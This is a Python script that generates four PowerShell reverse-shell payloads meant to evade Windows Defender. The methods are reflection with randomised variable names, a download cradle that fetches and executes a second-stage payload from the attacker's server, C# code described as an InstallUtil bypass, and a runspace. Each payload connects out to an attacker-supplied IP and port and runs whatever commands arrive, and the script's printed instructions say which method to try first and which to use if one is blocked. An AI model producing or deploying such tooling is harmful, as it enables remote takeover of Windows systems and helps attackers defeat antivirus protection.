#!/usr/bin/env python3
"""
Generate PowerShell payloads that evade Windows Defender
"""

import sys
import base64
import random
import string

def generate_random_var():
    """Generate random variable name"""
    return ''.join(random.choices(string.ascii_letters, k=random.randint(6,10)))

def method1_reflection(ip, port):
    """Use reflection to avoid detection"""
    vars = {f'v{i}': generate_random_var() for i in range(10)}
    
    payload = f"""
# Reflection Method
${vars['v1']} = [Type]::GetType('System.' + 'Net.Sockets.' + 'TcpClient')
${vars['v2']} = New-Object ${vars['v1']}
${vars['v2']}.Connect('{ip}', {port})
${vars['v3']} = ${vars['v2']}.GetStream()
${vars['v4']} = New-Object Byte[] 65535

while(${vars['v2']}.Connected) {{
    if(${vars['v3']}.DataAvailable) {{
        ${vars['v5']} = ${vars['v3']}.Read(${vars['v4']}, 0, ${vars['v4']}.Length)
        if(${vars['v5']} -gt 0) {{
            ${vars['v6']} = [Text.Encoding]::ASCII.GetString(${vars['v4']}, 0, ${vars['v5']})
            try {{
                ${vars['v7']} = Invoke-Expression ${vars['v6']} 2>&1 | Out-String
            }} catch {{
                ${vars['v7']} = $_.Exception.Message
            }}
            ${vars['v8']} = [Text.Encoding]::ASCII.GetBytes(${vars['v7']} + 'PS> ')
            ${vars['v3']}.Write(${vars['v8']}, 0, ${vars['v8']}.Length)
            ${vars['v3']}.Flush()
        }}
    }}
    Start-Sleep -Milliseconds 100
}}
${vars['v2']}.Close()
"""
    return payload

def method2_download_cradle(ip, port):
    """Download and execute from web"""
    payload = f"""
# Download Cradle Method
$ProgressPreference = 'SilentlyContinue'
$url = 'http://{ip}:8000/payload.txt'
$web = New-Object System.Net.WebClient
$web.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$data = $web.DownloadString($url)
Invoke-Expression $data
"""
    
    # Also create the payload to be downloaded
    inner_payload = f"""
$tcp = New-Object System.Net.Sockets.TcpClient('{ip}', {port})
$stream = $tcp.GetStream()
$buffer = New-Object Byte[] 1024
while($tcp.Connected) {{
    if($stream.DataAvailable) {{
        $read = $stream.Read($buffer, 0, 1024)
        $cmd = [Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        $result = Invoke-Expression $cmd 2>&1 | Out-String
        $bytes = [Text.Encoding]::ASCII.GetBytes($result + 'PS> ')
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
    }}
    Start-Sleep -Milliseconds 100
}}
$tcp.Close()
"""
    
    # Save inner payload
    with open('payload.txt', 'w') as f:
        f.write(inner_payload)
    
    return payload

def method3_installutil(ip, port):
    """Use InstallUtil bypass technique"""
    
    payload = f"""
# InstallUtil Bypass Method
$source = @"
using System;
using System.Net.Sockets;
using System.IO;
using System.Text;
namespace Bypass {{
    public class Program : System.Configuration.Install.Installer {{
        public override void Uninstall(System.Collections.IDictionary savedState) {{
            Run();
        }}
        
        public static void Run() {{
            TcpClient client = new TcpClient("{ip}", {port});
            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream) {{ AutoFlush = true }};
            
            while(client.Connected) {{
                writer.Write("PS> ");
                string cmd = reader.ReadLine();
                if(cmd != null && cmd.Length > 0) {{
                    try {{
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + cmd;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.Start();
                        writer.WriteLine(process.StandardOutput.ReadToEnd());
                    }} catch(Exception e) {{
                        writer.WriteLine("Error: " + e.Message);
                    }}
                }}
            }}
            client.Close();
        }}
    }}
}}
"@

Add-Type -TypeDefinition $source -Language CSharp
[Bypass.Program]::Run()
"""
    return payload

def method4_runspace(ip, port):
    """Use PowerShell runspaces"""
    
    payload = f"""
# Runspace Method
$code = {{
    $client = New-Object System.Net.Sockets.TcpClient('{ip}', {port})
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    
    while($client.Connected) {{
        $writer.Write('PS> ')
        $cmd = $reader.ReadLine()
        if($cmd) {{
            try {{
                $result = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($result)
            }} catch {{
                $writer.WriteLine($_.Exception.Message)
            }}
        }}
    }}
    $client.Close()
}}

$runspace = [runspacefactory]::CreateRunspace()
$runspace.Open()
$pipeline = $runspace.CreatePipeline()
$pipeline.Commands.AddScript($code)
$pipeline.Invoke()
$runspace.Close()
"""
    return payload

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 generate_evasive.py <IP> <PORT>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    print(f"[*] Generating evasive payloads for {ip}:{port}")
    
    # Generate all methods
    payloads = {
        'evasive_reflection.ps1': method1_reflection(ip, port),
        'evasive_download.ps1': method2_download_cradle(ip, port),
        'evasive_installutil.ps1': method3_installutil(ip, port),
        'evasive_runspace.ps1': method4_runspace(ip, port)
    }
    
    for filename, content in payloads.items():
        with open(filename, 'w') as f:
            f.write(content)
        print(f"[+] Created: {filename}")
    
    print("\n[*] Payloads generated successfully")
    print("[*] Start with evasive_reflection.ps1")
    print("[*] If blocked, try evasive_download.ps1 (requires HTTP server)")
    print("[*] These use legitimate Windows features to avoid detection")

if __name__ == "__main__":
    main()
